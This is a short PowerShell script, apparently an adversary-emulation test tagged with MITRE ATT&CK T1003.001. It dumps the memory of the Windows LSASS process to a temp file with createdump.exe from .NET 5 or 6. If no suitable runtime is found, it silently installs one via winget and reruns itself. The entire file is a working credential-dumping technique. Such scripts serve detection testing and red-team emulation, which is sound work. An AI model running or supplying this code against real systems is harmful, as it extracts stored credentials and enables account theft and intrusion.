<# 
    T1003.001 - OS Credential Dumping: LSASS Memory
    This script will use createdump.exe from Microsoft Dotnet version 5 or 6 to dump lsass process
#>


$exePath =  Resolve-Path "$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\*\createdump.exe"
$lsass_pid = (Get-Process lsass).id
$dumpfile = "$env:Temp\dotnet-lsass_$lsass_pid.dmp"

if (Test-Path $exePath){
    foreach($exe in $exePath){
        $version_string = ($exe.Path.Split('\\')[-2])
        [int]$version = $version_string.Split('.')[0]
        Write-Host "Dumping lsass process with $exe"
        if($version -ge 7){
            Write-Host -ForegroundColor Red "Error: Dotnet version = $version_string : with dotnet version >= 7, The pid argument is no longer supported. use dotnet version 5 or 6`n install Dotnet 6: winget install Microsoft.DotNet.DesktopRuntime.6 --accept-source-agreements --accept-package-agreements --silent"
        }
        else{
            & "$exe" -u -f $dumpfile $lsass_pid
            if($? -eq $true){
                Write-Host -ForegroundColor Green "Sucess: Lsass process dumped to $dumpfile using createdump.exe from Dotnet $version_string "
            }
        }
    }
}
else{
    Write-Host -ForegroundColor Red "Error: Dotnet version with createdump.exe not found on system"
    Write-Host "Installing Dotnet 5 and Dotnet 6..."
    #install dotnet 5
    winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent
    #install dotnet 6
    winget install Microsoft.DotNet.DesktopRuntime.6 --accept-source-agreements --accept-package-agreements --silent
    if (Test-Path $exePath){
        Write-Host -ForegroundColor Green "Sucess: Dotnet installed successfully, retrying..."
        . $PSCommandPath
    }
}
